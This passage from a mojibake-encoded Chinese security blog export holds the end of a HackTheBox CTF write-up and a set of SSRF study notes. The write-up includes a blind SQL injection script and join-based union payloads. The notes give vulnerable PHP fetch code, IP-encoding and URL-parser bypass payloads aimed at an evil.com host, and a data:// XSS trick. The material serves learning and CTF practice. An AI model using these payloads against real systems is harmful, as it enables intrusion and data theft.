è€Œä¸”ä»¥ä¸Šè¿‡æ»¤éƒ½æ˜¯æ­£åˆ™åŒ¹é…ï¼Œæ²¡æ³•ç”¨æ‹›æ•°ç»•è¿‡ï¼Œåªèƒ½æ‰¾æ›¿ä»£ã€‚é¦–å…ˆorder byç”¨group byä»£æ›¿ï¼Œè¿™ç‚¹ä¸éš¾ã€‚å¾—åˆ°å­—æ®µæ•°ä¸º2ã€‚é€—å·è¿‡æ»¤å°±æ¯”è¾ƒå±€é™äº†ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬è¦ä¹ˆä½¿ç”¨ç›²æ³¨ï¼Œè¦ä¹ˆä½¿ç”¨joinæ³¨å…¥ã€‚information_schema.tablesåœ¨ä¹‹å‰çš„swpuweb1ä¸­ä¹Ÿè§åˆ°è¿‡äº†ï¼Œè‚¯å®šå­˜åœ¨å¯¹åº”çš„æ›¿ä»£è¡¨å¯ä»¥è®©æˆ‘ä»¬è·å–è¡¨åã€‚ä½†æ˜¯where, concat,limitä¸å¤ªå¥½è§£å†³ã€‚(å…¶å®åˆ°æœ€åæ‰å‘ç°ï¼Œä¸éœ€è¦åº”å¯¹è¿™å‡ ä¸ªè¿‡æ»¤)å…¶ä¸­concatä¹Ÿè®¸å¯ä»¥ç”¨make_set()èµ·åˆ°è¿æ¥å­—ç¬¦ä¸²çš„æ•ˆæœã€‚ä½†æ˜¯make_set()éœ€è¦è‡³å°‘ä¸¤ä¸ªå‚æ•°ï¼Œä¹Ÿå¿…é¡»è¦é€—å·ï¼›è€Œwhereç­‰ç­‰è¿‡æ»¤ä¹Ÿä¸å¥½åŠã€‚ æ€»ä¹‹å…ˆä»ç®€å•çš„å¼€å§‹å§ï¼Œæˆ‘é€‰æ‹©ä½¿ç”¨ç›²æ³¨çˆ†å‡ºæ•°æ®åº“åä¸ç‰ˆæœ¬å·ã€‚è„šæœ¬å¦‚ä¸‹ï¼š 12345678910111213141516171819for i in range(1,8): print(i) a=0 for j in range(95, 128): url = \"http://docker.hackthebox.eu:32614/index.php?obj=\" #10.3.20-MariaDB payload = \"1' and ascii(substr((select database()) from \"+str(i)+\" for 1))=\" + str(j) + \"#\" payload = base64.b64encode(json.dumps(&#123;\"ID\": payload&#125;).encode('utf-8')) payload = str(payload, 'utf-8') url += payload r = requests.get(url) soup = BeautifulSoup(r.text, 'html.parser') body = soup.find('body').text.strip() if 'Good' in body: flag += chr(j) print(flag) a=1 break if a==0: break ç”±äºä¸éœ€è¦ç»•å…¶ä»–è¿‡æ»¤ï¼Œåªéœ€è¦ç”¨select case from {0} for 1ä»£æ›¿substr(case,{0},1)ã€‚ç„¶è€Œç›²æ³¨è„šæœ¬åªèƒ½è§£å†³è¿™ä¸¤ä¸ªé—®é¢˜ï¼Œå¾—ä¸åˆ°è¡¨åï¼Œè€Œä¸”è¿˜è´¼æ…¢ï¼Œæˆ‘åªèƒ½å¦å¯»å…¶ä»–æ–¹æ³•æ³¨å…¥è¡¨åã€‚ è€ƒè™‘åˆ°é€—å·è¿‡æ»¤æ—¶å¦ä¸€ç§æ–¹æ³•ï¼Œjoinæ³¨å…¥ï¼Œæˆ‘ä»¬æ ¹æ®ç¡®è®¤çš„ä¸¤ä¸ªå­—æ®µæ•°æ„é€ payload: 1payload&#x3D;&quot;1&#39; union select* from (select 1)a join (select 2)b#&quot; ç»“æœå‡ºä¹æˆ‘æ„æ–™ä¹‹å¤–ï¼Œå›æ˜¾å‡ºç°äº† 1Good Luck, You&#39;ve got that this is really gonna be an intersting challenge :)2 ä¹Ÿå°±æ˜¯è¯´ç¬¬äºŒä¸ªå­—æ®µæœ‰å›æ˜¾â€¦â€¦æ‰€ä»¥å…¶å®ä¸éœ€è¦ç›²æ³¨ï¼Œç›´æ¥æ ¹æ®å›æ˜¾union selectåšå°±å¥½äº†ã€‚æ‰€ä»¥ä¸‹ä¸€æ­¥å‡†å¤‡æ‹¿åˆ°è¡¨åï¼Œè¿™é‡Œåœ¨æˆ‘å§‹ç»ˆçº ç»“äºæ— æ³•ä½¿ç”¨group_concat()è¦æ€ä¹ˆæ‹¿åˆ°å…¨éƒ¨æ•°æ®æ—¶ï¼Œå¸ˆå‚…çš„æç¤ºè®©æˆ‘æ³¨æ„åˆ°äº†è¿™é‡Œçš„æŠ¥é”™å‡½æ•°ï¼š 1Warning: mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, bool given in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 34 è¿™é‡Œçš„sqlæ³¨å…¥æ˜¯é€šè¿‡mysqli_fetch_assoc()è¾¾æˆçš„ï¼Œå…¶è¿”å›å€¼ä¸ºï¼šè¿”å›ä»£è¡¨è¯»å–è¡Œçš„å…³è”æ•°ç»„ã€‚æ‰€ä»¥ä¸éœ€è¦concatï¼Œä¹Ÿå¯ä»¥å¾—åˆ°ä¸€è¡Œæ³¨å…¥å¾—åˆ°çš„å…¨éƒ¨æ•°æ®ã€‚æ‰€ä»¥æ³¨å…¥è¡¨åå°±ä¸å†æ‹…å¿ƒé‚£äº›é—®é¢˜ï¼Œåªè¦æŠŠinformation_schema.tablesçš„ä»£æ›¿æ‰¾åˆ°å°±å¥½(ç”±äºä¹‹å‰æ³¨å…¥è¿‡ç‰ˆæœ¬ï¼Œç¡®è®¤æ˜¯10.3.20ï¼Œå¯ä»¥ç”¨mysql.innodb_table_statsä»£æ›¿) 1payload &#x3D; &quot;&#39; UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name from mysql.innodb_table_stats)b#&quot; å¾—åˆ°è¡¨åçš„è¿æ¥å­—ç¬¦ä¸² 1DATAFlagTableUnguessableEzPZgtid_slave_pos æ¥ä¸‹æ¥ç”±äºinformation_schema.columnsæ‰¾ä¸åˆ°æ›¿ä»£æ–¹å¼ï¼Œçœ‹æ¥æ˜¯è·Ÿswpuä¸€æ ·çš„æ— åˆ—åæ³¨å…¥äº†ã€‚ä¹‹å‰æ–‡ç« é‡Œä¹Ÿå†™è¿‡ï¼Œè€Œæ­¤å¤„çš„æ— åˆ—åæ³¨å…¥ç¨æœ‰åŒºåˆ«ï¼Œå±äºæœªè¿‡æ»¤`åå¼•å·ï¼Œè¿‡æ»¤æ‰é€—å·çš„æƒ…å†µã€‚æ‰€ä»¥æ¨¡æ¿æ˜¯ï¼š 10&#39; union select * from (select 1)a join (select &#96;2&#96; from (select * from (select 1)a join (select 2)b join (select 3)c union select * from &#39;è¡¨å&#39;)i )b # å®é™…ä¸Šè¿™é“é¢˜ç›®ä¸ç¬¬äº”å±Šä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ› easysqlååˆ†ç›¸åƒï¼Œå› æ­¤å¯ä»¥ä½œä¸ºå‚è€ƒã€‚ä¸‹é¢ä¸€æ­¥å°±æ˜¯è¦çŒœå­—æ®µæ•°è·Ÿè¡¨åäº†ï¼Œé¦–å…ˆåˆ¤æ–­è¡¨åï¼Œä¸Šç½‘æœä¸‹å‘ç°mysql.gtid_slave_posæ˜¯ä¸€ç§ç³»ç»Ÿè¡¨ï¼Œæ‰€ä»¥ä¼°è®¡æœ€åä¸€éƒ¨åˆ† gtid_slave_posæ˜¯ä¸€å¼ è¡¨ã€‚ä¹‹åæŒ‰ç…§è¿™ä¸ªæ¨¡æ¿ä¸å˜ï¼Œåªæ”¹è¡¨åï¼Œå‘ç°Dataæ˜¯ä¸€å¼ è¡¨ã€‚ä¸”å†…å®¹å°±æ˜¯æˆ‘ä»¬ä¹‹å‰å›æ˜¾çš„sqlæ³¨å…¥æç¤ºçš„å†…å®¹ï¼Œæ•…åˆšå¥½2ä¸ªå­—æ®µã€‚é‚£ä¹ˆä¼°è®¡flagå°±åœ¨FlagTableUnguessableEzPZè¿™å¼ è¡¨äº†ï¼Œè€Œä¸”çŒœæµ‹ä¸€å¼ æœ‰flagè¡¨åªæœ‰ä¸€åˆ—ï¼Œæ‰€ä»¥æ”¹æˆä¸€ä¸ªå­—æ®µè¯•è¯• 1payload=\"' UNION SELECT * FROM (SELECT 1)m JOIN (SELECT `1` from (select * from (select 1)a union select * from FlagTableUnguessableEzPZ)x )n#\" æˆåŠŸæ‹¿åˆ°flagã€‚ æ€»ç»“ä¸‹å§ï¼Œè¿™ç®—æ˜¯ä¸€é“å¾ˆæœ‰è¥å…»çš„é¢˜ç›®äº†ã€‚å¦‚æœèƒ½æ ¹æ®æŠ¥é”™å‘ç°åé¢çš„sqlæ³¨å…¥ï¼Œå°±ç®—è·¨è¿‡äº†ä¸€å¤§æ­¥ï¼Œè¿™äº›ä¸»è¦æ˜¯å¯¹phpç‰¹æ€§çš„ç†è§£ã€‚è€Œæˆ‘åœ¨sqlæ³¨å…¥è¿™ä¸€æ­¥ä¸Šå€’æ˜¯ä¹Ÿå¡äº†å¥½ä¹…â€¦â€¦ä¸è¿‡é¢˜ç›®å¾ˆå¥½çš„å¸®æˆ‘å†ä¸€æ¬¡å¤ä¹ äº†æ— åˆ—åæ³¨å…¥è¿™ä¸ªæœ‰æ„æ€çš„çŸ¥è¯†ç‚¹ï¼Œä»¥åŠjoinç»•è¿‡é€—å·è¿™ä¸€ç»å…¸æ–¹æ³•ã€‚çœ‹æ¥å¯ä»¥ä½œä¸ºbypassinformation_schemaçš„å¸¸è§„æ­¦å™¨ä½¿ç”¨äº†ã€‚","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"}]},{"title":"å­¦ä¹ ç¬”è®°-SSRFåŸºç¡€","slug":"å­¦ä¹ ç¬”è®°-SSRFåŸºç¡€","date":"2020-02-05T04:20:52.000Z","updated":"2021-02-18T05:08:46.733Z","comments":true,"path":"2020/02/05/å­¦ä¹ ç¬”è®°-SSRFåŸºç¡€/","link":"","permalink":"https://www.bycsec.top/2020/02/05/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SSRF%E5%9F%BA%E7%A1%80/","excerpt":"ç»ˆäºå‡†å¤‡æŠŠæ¬ äº†å¥½ä¹…çš„SSRFå­¦ä¹ è®°å½•ä¸€ä¸‹äº†ã€‚æœ€æ—©æ¥è§¦SSRFæ˜¯å»å¹´æš‘å‡ï¼Œå¸ˆå‚…ç»™äº†æˆ‘ä¸€é“éƒç¦»æ­Œå‡ºçš„å…¥ç¾¤é¢˜ã€‚å½“æ—¶å¯¹SSRFä¸€æ— æ‰€çŸ¥ï¼Œä¸œæ‹¼è¥¿å‡‘æ‰å¾—åˆ°ä¸€ä¸ªipã€‚å¯æƒœå½“æ—¶ä¸çŸ¥é“æ˜¯å†…ç½‘ip,æœ€åæ¶‰åŠä¸€ä¸ªgopheræ‰“mysqlçš„å¸¸è§ç±»å‹ï¼Œæœ€åä¹Ÿæ²¡èƒ½åšå‡ºæ¥ã€‚é‚£ä¹‹åä¹Ÿæ²¡æœ‰ä»”ç»†åšè¿‡ssrfé¢˜ç›®ï¼Œé‚£æˆ‘ç°åœ¨å°±æ¥è®°å½•ä¸€ä¸‹ssrfçš„å­¦ä¹ ç¬”è®°å§ã€‚","text":"ç»ˆäºå‡†å¤‡æŠŠæ¬ äº†å¥½ä¹…çš„SSRFå­¦ä¹ è®°å½•ä¸€ä¸‹äº†ã€‚æœ€æ—©æ¥è§¦SSRFæ˜¯å»å¹´æš‘å‡ï¼Œå¸ˆå‚…ç»™äº†æˆ‘ä¸€é“éƒç¦»æ­Œå‡ºçš„å…¥ç¾¤é¢˜ã€‚å½“æ—¶å¯¹SSRFä¸€æ— æ‰€çŸ¥ï¼Œä¸œæ‹¼è¥¿å‡‘æ‰å¾—åˆ°ä¸€ä¸ªipã€‚å¯æƒœå½“æ—¶ä¸çŸ¥é“æ˜¯å†…ç½‘ip,æœ€åæ¶‰åŠä¸€ä¸ªgopheræ‰“mysqlçš„å¸¸è§ç±»å‹ï¼Œæœ€åä¹Ÿæ²¡èƒ½åšå‡ºæ¥ã€‚é‚£ä¹‹åä¹Ÿæ²¡æœ‰ä»”ç»†åšè¿‡ssrfé¢˜ç›®ï¼Œé‚£æˆ‘ç°åœ¨å°±æ¥è®°å½•ä¸€ä¸‹ssrfçš„å­¦ä¹ ç¬”è®°å§ã€‚ 1. SSRF ssrfå…¨ç§°ä¸ºServer-side Request Forgeryï¼Œå³æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ”»å‡»ã€‚å¾ˆå¤šwebåº”ç”¨éƒ½æä¾›äº†ä»å…¶ä»–çš„æœåŠ¡å™¨ä¸Šè·å–æ•°æ®çš„åŠŸèƒ½ã€‚ä½¿ç”¨ç”¨æˆ·æŒ‡å®šçš„URLï¼Œwebåº”ç”¨å¯ä»¥è·å–å›¾ç‰‡ï¼Œä¸‹è½½æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶å†…å®¹ç­‰ã€‚è¿™ä¸ªåŠŸèƒ½å¦‚æœè¢«æ¶æ„ä½¿ç”¨ï¼Œå¯ä»¥åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„webåº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œssrfçš„æ¼æ´ç‚¹åœ¨äºï¼šæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œåœ¨ç”¨æˆ·å¯æ§çš„æƒ…å†µä¸‹ï¼Œæœªå¯¹ç›®æ ‡åœ°å€è¿›è¡Œè¿‡æ»¤ä¸é™åˆ¶.å¸¸è§åœºæ™¯åŒ…æ‹¬ä½†ä¸ä»…é™äºï¼š 1234567891.ç¤¾äº¤åˆ†äº«åŠŸèƒ½ï¼šè·å–è¶…é“¾æ¥çš„æ ‡é¢˜ç­‰å†…å®¹è¿›è¡Œæ˜¾ç¤º2.è½¬ç æœåŠ¡ï¼šé€šè¿‡URLåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•æµè§ˆ3.åœ¨çº¿ç¿»è¯‘ï¼šç»™ç½‘å€ç¿»è¯‘å¯¹åº”ç½‘é¡µçš„å†…å®¹4.å›¾ç‰‡åŠ è½½&#x2F;ä¸‹è½½ï¼šä¾‹å¦‚å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ä¸­çš„ç‚¹å‡»ä¸‹è½½å›¾ç‰‡åˆ°æœ¬åœ°ï¼›é€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡#æ¯”å¦‚hgameweek25.å›¾ç‰‡&#x2F;æ–‡ç« æ”¶è—åŠŸèƒ½ï¼šä¸»è¦å…¶ä¼šå–URLåœ°å€ä¸­titleä»¥åŠæ–‡æœ¬çš„å†…å®¹ä½œä¸ºæ˜¾ç¤ºä»¥æ±‚ä¸€ä¸ªå¥½çš„ç”¨å…·ä½“éªŒ6.äº‘æœåŠ¡å‚å•†ï¼šå®ƒä¼šè¿œç¨‹æ‰§è¡Œä¸€äº›å‘½ä»¤æ¥åˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜æ´»ç­‰ï¼Œæ‰€ä»¥å¦‚æœå¯ä»¥æ•è·ç›¸åº”çš„ä¿¡æ¯ï¼Œå°±å¯ä»¥è¿›è¡Œssrfæµ‹è¯•7.ç½‘ç«™é‡‡é›†ï¼Œç½‘ç«™æŠ“å–çš„åœ°æ–¹ï¼šä¸€äº›ç½‘ç«™ä¼šé’ˆå¯¹ä½ è¾“å…¥çš„urlè¿›è¡Œä¸€äº›ä¿¡æ¯é‡‡é›†å·¥ä½œ...... å¦‚æœè¦ä»æœåŠ¡ç«¯çš„æºç å±‚é¢æ¥è®²ï¼Œä¸»è¦å°±æ˜¯ä»¥ä¸‹ä¸‰ç§å‡½æ•°(php)ï¼š 1.file_get_contents() 1234567891011&lt;?phpif (isset($_POST['url'])) &#123; $content = file_get_contents($_POST['url']); $filename ='./images/'.rand().';img1.jpg'; file_put_contents($filename, $content); echo $_POST['url']; $img = \"&lt;img src=\\\"\".$filename.\"\\\"/&gt;\"; &#125; echo $img; ?&gt; å¸¸è§çš„ç›´æ¥ç”¨file_get_contents()åŠ è½½urlæŒ‡å‘æ–‡ä»¶2.fsockopen() 123456789101112131415161718192021&lt;?php function GetFile($host,$port,$link) &#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) &#123; echo \"$errstr (error number $errno) \\n\"; &#125; else &#123; $out = \"GET $link HTTP/1.1\\r\\n\"; $out .= \"Host: $host\\r\\n\"; $out .= \"Connection: Close\\r\\n\\r\\n\"; $out .= \"\\r\\n\"; fwrite($fp, $out); $contents=''; while (!feof($fp)) &#123; $contents.= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125; &#125;?&gt; è¿™ä¸ªå‡½æ•°ä¼šä½¿ç”¨socketè·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œä¼ è¾“åŸå§‹æ•°æ®ã€‚ 3.curl_exec() 12345678910111213141516&lt;?php if (isset($_POST['url']))&#123;$link = $_POST['url'];$curlobj = curl_init();curl_setopt($curlobj, CURLOPT_POST, 0);curl_setopt($curlobj,CURLOPT_URL,$link);curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($curlobj);curl_close($curlobj);$filename = './curled/'.rand().'.txt';file_put_contents($filename, $result); echo $result;&#125;?&gt; å‡å¦‚å‡ºç°ä»¥ä¸Šå‡ ç§å‡½æ•°ï¼ˆå·²çŸ¥æºç å‰æä¸‹ï¼‰ï¼Œé€šå¸¸å¯ä»¥å°è¯•ä½¿ç”¨ssrfã€‚ 2.SSRFçš„åˆ©ç”¨å®è¯è¯´ï¼Œssrfä¸åƒsqlï¼Œxssé‚£æ ·å±äºäººå°½çš†çŸ¥çš„æ¼æ´ã€‚ä½†å…¶åˆ©ç”¨åœ¨çœŸå®æ¸—é€ä¸­æ˜¯éå¸¸å¸¸è§çš„ã€‚å…¶åˆ©ç”¨åœºæ™¯ä¸»è¦æœ‰ï¼š 123456789101.è®©æœåŠ¡ç«¯å»è®¿é—®ç›¸åº”çš„ç½‘å€(æ¯”å¦‚è¯»&#x2F;flagä¹‹ç±»çš„)2.è®©æœåŠ¡ç«¯å»è®¿é—®è‡ªå·±æ‰€å¤„å†…ç½‘çš„ä¸€äº›æŒ‡çº¹æ–‡ä»¶æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ç›¸åº”çš„cms3.å¯ä»¥ä½¿ç”¨&#96;&#96;&#96;fileã€dictã€gopherã€ftp&#96;&#96;&#96;åè®®è¿›è¡Œè¯·æ±‚è®¿é—®ç›¸åº”çš„æ–‡ä»¶(å…¶ä¸­gopherè¢«ç§°ä½œä¸‡é‡‘æ²¹ï¼Œå¯ä»¥æ‰“å†…ç½‘ä¹Ÿå¯ä»¥get,post,å½“ç„¶è¿˜æœ‰æ”»å‡»å†…ç½‘æœªæˆæƒçš„mysqlï¼Œä¸»è¦åŒºåˆ«åœ¨äºä¸é»˜è®¤ç«¯å£)4.æ”»å‡»å†…ç½‘webåº”ç”¨ï¼ˆå¯ä»¥å‘å†…éƒ¨ä»»æ„ä¸»æœºçš„ä»»æ„ç«¯å£å‘é€ç²¾å¿ƒæ„é€ çš„æ•°æ®åŒ…&#123;payload&#125;ï¼‰(ssrfæ‰“redis)5.æ”»å‡»å†…ç½‘åº”ç”¨ç¨‹åºï¼ˆåˆ©ç”¨è·¨åè®®é€šä¿¡æŠ€æœ¯ï¼‰6.åˆ¤æ–­å†…ç½‘ä¸»æœºæ˜¯å¦å­˜æ´»ï¼šæ–¹æ³•æ˜¯è®¿é—®çœ‹æ˜¯å¦æœ‰**ç«¯å£å¼€æ”¾**7.åˆ©ç”¨pharåè®®è§¦å‘ååºåˆ—åŒ– CTFé¢˜ç›®ä¸­å…·ä½“è§è¿‡çš„åŒ…æ‹¬ä¹‹å‰hackergameçš„ä¸€é“ä¼ªssrfï¼ˆåªæ¶‰åŠåˆ°urlï¼‰ï¼›NCTF2019 True-XML-Cookbookä»¥åŠhgameçš„Cosmosçš„åšå®¢åå°ï¼ˆæœç„¶è¿˜æ˜¯åšå¾—å¤ªå°‘äº†ï¼‰ 3.ç»•è¿‡å…³äºç»•è¿‡ï¼ŒæŠŠé‡ç‚¹æ”¾åœ¨å‡ ä¸ªå¤§ç±»ä¸Šï¼š 1ï¼‰ipåœ°å€ç»•è¿‡å¯¹192.168.0.1 12348è¿›åˆ¶ï¼š0300.0250.0.116è¿›åˆ¶ï¼š0xC0.0xA8.0.110è¿›####åˆ¶ï¼š323223552116è¿›åˆ¶æ•´æ•°: 0xC0A80001 ä¹Ÿå¯ä»¥é€šè¿‡çœç•¥è¾¾åˆ°åŒæ ·çš„æ•ˆæœå¯¹10.0.0.1 12341.http:&#x2F;&#x2F;0&#x2F;2.http:&#x2F;&#x2F;127.1&#x2F;3.ipv6:http:&#x2F;&#x2F;[::1]&#x2F;4.http:&#x2F;&#x2F;127.0.0.1.&#x2F; 2)url bypassè¿™åº”è¯¥æ˜¯æ˜¯åŸºç¡€ç±»ssrfæœ€å¸¸è§çš„è€ƒç‚¹äº†ï¼Œæ¯”è¾ƒé€‚åˆæˆ‘è¿™æ ·çš„èŒæ–°æ€»ç»“ã€‚åœ¨è°ˆåŠç»•è¿‡ä¹‹å‰ï¼Œå…ˆæ¥ç†è§£ä¸‹urlçš„åŸºæœ¬æ¦‚å¿µï¼šå¯ä»¥æ³¨æ„åˆ°urlçš„ç»„æˆéƒ¨åˆ†ã€‚ 1234567scheme åè®®authority æƒé™&#x3D;ä¸»æœºå+ç«¯å£å· ï¼Œå†è¯¦ç»†ä¸€ç‚¹å¦‚![2.jpg](https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;18060177-6d443ccaaa9138ba.jpg?imageMogr2&#x2F;auto-orient&#x2F;strip%7CimageView2&#x2F;2&#x2F;w&#x2F;1240)admin:admin@www.example.com:2333&#96;ï¼ˆä½¿ç”¨ç”¨æˆ·åä¸º adminï¼Œå¯†ç ä¸º adminï¼Œè®¿é—® www.example.com çš„ 2333 ç«¯å£è·å–èµ„æºï¼‰path è·¯å¾„query æŸ¥è¯¢fragment æŒ‡å‘ä¸€ä¸ªæ›´ä½çº§åˆ«çš„èµ„æº æˆ‘ä»¬å¸¸å¸¸é€šè¿‡æ„é€ urlæ¥bypassä¸ªåˆ«å‡½æ•°ï¼Œæœ€ç»ˆè¾¾æˆssrfçš„ç›®çš„ã€‚è€Œorangeçš„é‚£ç¯‡ç»å…¸çš„pdfæŒ‡å‡ºäº†å‡ ä¸ªå‡½æ•°åˆ©ç”¨ä¸Šçš„ç»å…¸æ¼æ´ï¼Œå…¶ä¸­ç¦»ä¸å¼€ä¸€ä¸ª@ï¼š 12345php parse_urlï¼šhost: åŒ¹é…æœ€åä¸€ä¸ª@åé¢ç¬¦åˆæ ¼å¼çš„hostlibcurlï¼šhostï¼šåŒ¹é…ç¬¬ä¸€ä¸ª@åé¢ç¬¦åˆæ ¼å¼çš„host åˆ©ç”¨@å¯ä»¥è½»æ¾ä½¿google.comï¼ˆé»˜è®¤ç™½åå•ï¼‰ç½®ä¸ºhostï¼Œè¾¾åˆ°ç»•è¿‡php parse_urlçš„æ•ˆæœï¼ˆè¿™é‡Œç”¨#å°†@å¿½ç•¥äº†ï¼‰ åŒæ ·å¯¹äºcurlæ“ä½œï¼Œå‡å¦‚ä½¿ç”¨libcurlåˆ™å°†ç¬¬ä¸€ä¸ª@åçš„å±é™©ç½‘ç«™ç½®ä¸ºæ‰§è¡Œcurlçš„å¯¹è±¡ï¼Œè¾¾åˆ°æ¼æ´åˆ©ç”¨ã€‚åŒæ ·æ•ˆæœçš„è¿˜æœ‰;å³http://evil.com;google.comã€‚curlä¼šå°†evil.comå½“æˆhostname,è€Œå°†åé¢çš„google.comå½“åšquqerystringã€‚ æåˆ°curl,è¿˜å¯ä»¥æåˆ°åç«¯ä»£ç çš„ä¸€ç§å¸¸è§æ­é… 12341.filter_varå¯¹urlè¿›è¡Œcheck2.parse_urlè·å–urlçš„host3.å¯¹hostè¿›è¡Œæ­£åˆ™åŒ¹é…4.execæ‰§è¡Œå‘½ä»¤ 12345678910111213141516171819&lt;?php echo \"Argument: \".$argv[1].\"\\n\"; // check if argument is a valid URL if(filter_var($argv[1], FILTER_VALIDATE_URL)) &#123; // parse URL $r = parse_url($argv[1]); print_r($r); // check if host ends with google.com if(preg_match('/google\\.com$/', $r['host'])) &#123; // get page from URL exec('curl -v -s \"'.$r['host'].'\"', $a); print_r($a); &#125; else &#123; echo \"Error: Host not allowed\"; &#125; &#125; else &#123; echo \"Error: Invalid URL\"; &#125;?&gt; å…³äºbypass filter_varåŠparse_urlä¹Ÿæ˜¯æœ‰å¦™æ‹›çš„ï¼šé¦–å…ˆæ˜¯ filter_varï¼šä¸Šé¢è¯´åˆ°ï¼Œhttp://evil.com;google.comæ˜¯å¯ä»¥æ‰§è¡Œcurlåˆ°å±é™©ç½‘ç«™çš„ã€‚ä½†æ˜¯å‡å¦‚åœ¨curlä¹‹å‰åŠ ä¸Šfilter_varåè¦æ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿå¾ˆç®€å•ï¼Œæ›´æ”¹åè®®å³å¯ 10:&#x2F;&#x2F;evil.com;google.com ä½†æ˜¯è¿™æ ·çš„è¯curlå¯èƒ½æ‰§è¡Œä¸äº†äº†ï¼Œæ‰€ä»¥æŠŠhostnameå¼ºè°ƒä¸€ä¸‹ 10:&#x2F;&#x2F;evil.com:80;google.com:80 åŠ ä¸Šç«¯å£å³å¯ã€‚ å…¶æ¬¡æ˜¯parse_urlï¼špase_urlå¹¶ä¸éœ€è¦å®Œå…¨ç»•è¿‡hostnameã€‚å› ä¸ºparse_urlçš„ä½œç”¨åªæ˜¯å°†ä¸€ä¸ªç»™å®šurlåˆ†æˆä¸Šé¢æåˆ°çš„scheme,hostnameï¼Œport,pathå‡ éƒ¨åˆ†ã€‚æ‰€ä»¥ä¸‹é¢è¿™ä¸ªpaylaod 10:&#x2F;&#x2F;evil$google.com åœ¨ç»è¿‡parse_urlåï¼Œhostnameä»ä¸ºevil$google.comã€‚ä½†æ˜¯å½“æºç ä¸­ 1exec(&#39;curl -v -s &quot;&#39;.$r[&#39;host&#39;].&#39;&quot;&#39;, $a); æ‰§è¡Œæ—¶ï¼Œbashä¼šå°†åé¢çš„$google.comå½“åšä¸€ä¸ªå˜é‡å¹¶ç½®ä¸ºç©ºï¼Œæ‰€ä»¥exec()æ—¶ä»æ˜¯æŒ‡å‘evil.comä½¿ç”¨å‰æï¼šç”¨exec systemæ‰§è¡Œcurl wgetä¹‹ç±»çš„ã€‚ ä»¥ä¸Šéƒ½æ˜¯curlå‡½æ•°çš„ssrfï¼Œé‚£ä¹ˆå¦‚æœæ˜¯file_get_contents()å‘¢ï¼šæ¯”å¦‚åªå°†ä¸Šé¢exec()éƒ¨åˆ†å‡½æ•°æ”¹ä¸º 12&#x2F;&#x2F; get page from URL$a &#x3D; file_get_contents($argv[1]); è¿™æ—¶å°±å¯ä»¥è€ƒè™‘åˆ°å¸¸å¸¸åˆ©ç”¨çš„å„ç§åè®®,æ¯”å¦‚dataåè®® 1data:&#x2F;&#x2F;google.com&#x2F;plain;base64,SSBsb3ZlIFBIUAo&#x3D; 12&#96;&#96;&#96;I love PHP æ‰€ä»¥å¦‚æœæŠŠåé¢çš„base64éƒ¨åˆ†æ¢ä½œxssä»£ç ç¼–ç åçš„ç»“æœï¼Œå°±å¯ä»¥æ‰§è¡Œxssã€‚ å…ˆè¿™æ ·ã€‚ç”±äºè¿˜æ²¡æ¥è§¦åˆ°ssrfçš„é«˜çº§æ‹“å±•åœºæ™¯ï¼Œç­‰æ—¥åæ¥è§¦åˆ°å†å†™ä¸€ç¯‡é«˜çº§åˆ©ç”¨ã€‚ å‚è€ƒæ–‡ç« ï¼š https://xz.aliyun.com/t/2115 https://skysec.top/2017/08/19/SSRF%E5%AD%A6%E4%B9%A0/ https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51 https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"æ­ç”µhgame-week3","slug":"æ­ç”µhgame-week3","date":"2020-02-02T10:27:44.000Z","updated":"2021-02-18T05:08:36.264Z","comments":true,"path":"2020/02/02/æ­ç”µhgame-week3/","link":"","permalink":"https://www.bycsec.top/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/","excerpt":"week3çš„éš¾åº¦æ›´ä¸Šä¸€å±‚æ¥¼ã€‚æœä¸å…¶ç„¶akæ‰webçš„flagå€’äº†ï¼Œæœ€åè¿˜æ˜¯å·®ä¸€é“é¢˜(å…¶å®æ˜¯å› 